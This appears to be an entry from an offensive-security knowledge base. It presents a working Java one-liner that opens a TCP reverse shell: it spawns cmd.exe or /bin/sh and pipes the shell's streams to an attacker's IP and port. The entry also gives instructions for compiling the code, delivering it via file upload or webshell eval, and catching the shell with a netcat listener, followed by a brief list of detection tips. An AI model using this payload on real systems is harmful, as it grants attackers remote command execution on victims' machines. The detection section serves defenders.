---
id: c82fc776-2ace-48b8-930e-f749807cf561
name: Java-One-Liner-Reverse-Shell
type: code
language: Java
verified: true
created_at: '2023-04-06T03:56:24.552129+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
  - macOS
tags:
  - reverse-shell
  - java
  - payload
validated: true
---

# Java-One-Liner-Reverse-Shell

## Code

```java
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Description

This Java one-liner creates a TCP reverse shell by spawning a process (e.g., cmd.exe), connecting to a remote host/port, and piping I/O streams bidirectionally. It handles input/output/error streams and maintains the connection until the process exits. Useful for post-exploitation in Java-enabled environments without relying on external binaries.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| host | Attacker's IP address | 192.168.1.100 |
| port | Attacker's listening port | 4444 |
| cmd | Target shell command | cmd.exe (Windows) or /bin/sh (Linux) |

## Usage

Save the code (with substituted parameters) to a .java file, compile with javac, and execute with java. Requires a listener (e.g., nc -lvnp port) on the attacker side. Deliver via file upload, webshell eval, or initial command execution. For Linux/macOS, change cmd to "/bin/sh".

## Detection

- Monitor Java process spawning with command-line arguments or network connections (e.g., via Sysmon Event ID 1 or network logs).
- Look for outbound TCP to unusual IPs/ports from java.exe/javaw.exe.
- Enable Java security manager or runtime logging to flag socket creations and ProcessBuilder usage.
- Behavioral detection: Unexpected interactive shells from Java processes.

## Related

- [[procedures/Establish-Java-Reverse-Shell]]
- [[tools/Netcat]]
